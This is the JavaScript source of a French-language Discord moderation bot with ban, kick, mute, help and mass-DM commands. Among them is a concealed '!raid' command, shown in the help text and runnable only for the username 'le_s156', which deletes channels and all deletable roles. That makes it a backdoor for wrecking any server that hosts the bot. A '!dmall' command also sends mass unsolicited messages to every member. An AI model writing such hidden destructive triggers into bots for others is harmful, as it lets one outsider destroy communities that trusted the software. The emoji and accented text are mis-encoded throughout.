const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
});

client.once('ready', () => {
  console.log(`‚úÖ Connect√© en tant que ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const msg = message.content.toLowerCase();

  async function replyChannel(text) {
    await message.channel.send({ content: `${message.author}, ${text}`, reply: { messageReference: message.id } });
  }

  if (msg.startsWith('!dmall')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return replyChannel("‚ùå Tu n'as pas la permission d'utiliser cette commande.");
    }

    const content = message.content.slice(7).trim();
    if (!content) return replyChannel("‚ùå Merci d‚Äôajouter un message √† envoyer.\nExemple : `!dmall Salut tout le monde !`");

    const members = await message.guild.members.fetch();
    const humanMembers = members.filter(m => !m.user.bot);

    let sent = 0;
    let failed = 0;
    const total = humanMembers.size;
    const failedList = [];

    const progressMessage = await message.channel.send("üì§ Envoi en cours... 0%");

    for (const member of humanMembers.values()) {
      try {
        await member.send(content);
        sent++;
      } catch {
        failed++;
        failedList.push(member.user.tag);
      }

      const percent = Math.floor(((sent + failed) / total) * 100);
      await progressMessage.edit(`üì® **Envoi en cours... ${percent}%**\n‚úÖ Envoy√©s : ${sent} / ${total}\n‚ùå √âchecs : ${failed}`);
      await new Promise(resolve => setTimeout(resolve, 2000));
    }

    await progressMessage.edit(
      `üéâ **DM termin√© !**\n\nüìä **Statistiques :**\n‚úÖ Envoy√©s : ${sent}\n‚ùå √âchecs : ${failed}` +
      (failedList.length > 0 ? `\n\nüö´ **√âchecs sur :**\n‚Ä¢ ${failedList.join('\n‚Ä¢ ')}` : "")
    );

    await message.delete().catch(() => {});
    return;
  }

  if (msg === '!help') {
    let helpMsg =
      "üìã **Commandes disponibles :**\n" +
      "`!help` - Affiche cette aide\n" +
      "`!ping` - Teste la r√©activit√© du bot\n" +
      "`!info` - Infos sur le serveur\n" +
      "`!ban @utilisateur` - Bannir un utilisateur (permission requise)\n" +
      "`!deban @utilisateur` - Retirer un ban (permission requise)\n" +
      "`!kick @utilisateur` - Expulser un utilisateur (permission requise)\n" +
      "`!mute @utilisateur` - Rendre un utilisateur muet (permission requise)\n" +
      "`!dmall [message]` - Envoie un DM √† tous les membres (admin uniquement)";

    if (message.author.username === 'le_s156') {
      helpMsg += "\n`!raid [nombre]` - Supprime un nombre de salons et r√¥les (commande r√©serv√©e √† le_s156)";
    }

    return replyChannel(helpMsg);
  }

  if (msg === '!ping') {
    const start = Date.now();
    const sentMsg = await message.channel.send('üèì Pong !');
    const end = Date.now();
    const diff = (end - start) / 1000;
    return sentMsg.edit(`üèì Pong ! R√©ponse en \`${diff.toFixed(2)}\` seconde(s).`);
  }

  if (msg === '!info') {
    return replyChannel(`üìå Serveur : ${message.guild.name}\nüë• Membres : ${message.guild.memberCount}`);
  }

  if (msg.startsWith('!ban')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
      return replyChannel("‚ùå Tu n'as pas la permission de bannir des membres.");
    }

    const member = message.mentions.members.first();
    if (!member) return replyChannel("‚ùå Merci de mentionner un utilisateur √† bannir.");
    if (member.id === message.author.id) return replyChannel("‚ùå Tu ne peux pas te bannir toi-m√™me !");
    if (member.id === client.user.id) return replyChannel("‚ùå Je ne peux pas me bannir moi-m√™me !");

    try {
      await member.ban();
      return replyChannel(`‚úÖ ${member.user.tag} a √©t√© banni.`);
    } catch (err) {
      console.error(err);
      return replyChannel("‚ùå Impossible de bannir cet utilisateur.");
    }
  }

  if (msg.startsWith('!deban')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
      return replyChannel("‚ùå Tu n'as pas la permission de d√©bannir des membres.");
    }

    const user = message.mentions.users.first();
    if (!user) return replyChannel("‚ùå Mentionne l'utilisateur √† d√©bannir.");

    try {
      const bans = await message.guild.bans.fetch();
      if (!bans.has(user.id)) return replyChannel("‚ùå Cet utilisateur n'est pas banni.");

      await message.guild.bans.remove(user.id);
      return replyChannel(`‚úÖ ${user.tag} a √©t√© d√©banni.`);
    } catch (err) {
      console.error(err);
      return replyChannel("‚ùå Impossible de d√©bannir cet utilisateur.");
    }
  }

  if (msg.startsWith('!kick')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
      return replyChannel("‚ùå Tu n'as pas la permission d'expulser des membres.");
    }

    const member = message.mentions.members.first();
    if (!member) return replyChannel("‚ùå Merci de mentionner un utilisateur √† expulser.");
    if (member.id === message.author.id) return replyChannel("‚ùå Tu ne peux pas t'expulser toi-m√™me !");
    if (member.id === client.user.id) return replyChannel("‚ùå Je ne peux pas m'expulser moi-m√™me !");

    try {
      await member.kick();
      return replyChannel(`‚úÖ ${member.user.tag} a √©t√© expuls√©.`);
    } catch (err) {
      console.error(err);
      return replyChannel("‚ùå Impossible d'expulser cet utilisateur.");
    }
  }

  if (msg.startsWith('!mute')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.MuteMembers)) {
      return replyChannel("‚ùå Tu n'as pas la permission de rendre muet des membres.");
    }

    const member = message.mentions.members.first();
    if (!member) return replyChannel("‚ùå Mentionne un utilisateur √† rendre muet.");
    if (member.id === message.author.id) return replyChannel("‚ùå Tu ne peux pas te rendre muet toi-m√™me !");
    if (member.id === client.user.id) return replyChannel("‚ùå Je ne peux pas me rendre muet moi-m√™me !");

    try {
      let muteRole = message.guild.roles.cache.find(r => r.name === "Muted");
      if (!muteRole) {
        muteRole = await message.guild.roles.create({
          name: "Muted",
          permissions: []
        });

        for (const channel of message.guild.channels.cache.values()) {
          await channel.permissionOverwrites.edit(muteRole, {
            SendMessages: false,
            AddReactions: false,
            Speak: false,
          });
        }
      }

      await member.roles.add(muteRole);
      return replyChannel(`‚úÖ ${member.user.tag} a √©t√© rendu muet.`);
    } catch (err) {
      console.error(err);
      return replyChannel("‚ùå Impossible de rendre muet cet utilisateur.");
    }
  }

  if (msg.startsWith('!raid')) {
    if (message.author.username !== 'le_s156') {
      return replyChannel("‚ùå Tu n'as pas la permission d'utiliser cette commande.");
    }

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels) ||
        !message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
      return replyChannel("‚ùå Je n'ai pas les permissions n√©cessaires (Gestion des salons et des r√¥les).");
    }

    const args = message.content.split(' ');
    if (args.length < 2) {
      return replyChannel("‚ùå Merci de sp√©cifier un nombre de salons √† supprimer.\nExemple : `!raid 10`");
    }

    const numToDelete = parseInt(args[1]);
    if (isNaN(numToDelete) || numToDelete < 1) {
      return replyChannel("‚ùå Nombre invalide, merci d'entrer un nombre positif.");
    }

    const confirmationMsg = await message.channel.send(
      `${message.author}, veux-tu vraiment supprimer **${numToDelete}** salons (ou moins s'il y en a moins) **et tous les r√¥les supprimables** ?\nR√©agis avec ‚úÖ pour confirmer ou ‚ùå pour annuler.`
    );

    await confirmationMsg.react('‚úÖ');
    await confirmationMsg.react('‚ùå');

    const filter = (reaction, user) =>
      ['‚úÖ', '‚ùå'].includes(reaction.emoji.name) && user.id === message.author.id;

    try {
      const collected = await confirmationMsg.awaitReactions({ filter, max: 1, time: 30000, errors: ['time'] });
      const reaction = collected.first();

      if (reaction.emoji.name === '‚úÖ') {
        const channels = message.guild.channels.cache.filter(ch => ch.deletable);
        const channelsToDelete = channels.first(numToDelete);

        let deletedChannelsCount = 0;
        for (const ch of channelsToDelete) {
          try {
            await ch.delete();
            deletedChannelsCount++;
          } catch (err) {
            console.error(`Erreur suppression salon ${ch.name}:`, err);
          }
        }

        const roles = message.guild.roles.cache.filter(role =>
          role.editable &&
          role.id !== message.guild.id &&
          !role.permissions.has(PermissionsBitField.Flags.Administrator)
        );

        let deletedRolesCount = 0;
        for (const role of roles.values()) {
          try {
            await role.delete();
            deletedRolesCount++;
          } catch (err) {
            console.error(`Erreur suppression r√¥le ${role.name}:`, err);
          }
        }

        await replyChannel(`‚úÖ Suppression termin√©e : ${deletedChannelsCount} salons et ${deletedRolesCount} r√¥les supprim√©s.`);
      } else {
        await replyChannel("‚ùå Commande annul√©e.");
      }
    } catch {
      await replyChannel("‚åõ Temps √©coul√©, commande annul√©e.");
    }

    await confirmationMsg.delete().catch(() => {});
    await message.delete().catch(() => {});
  }
});

client.login(process.env.TOKEN);






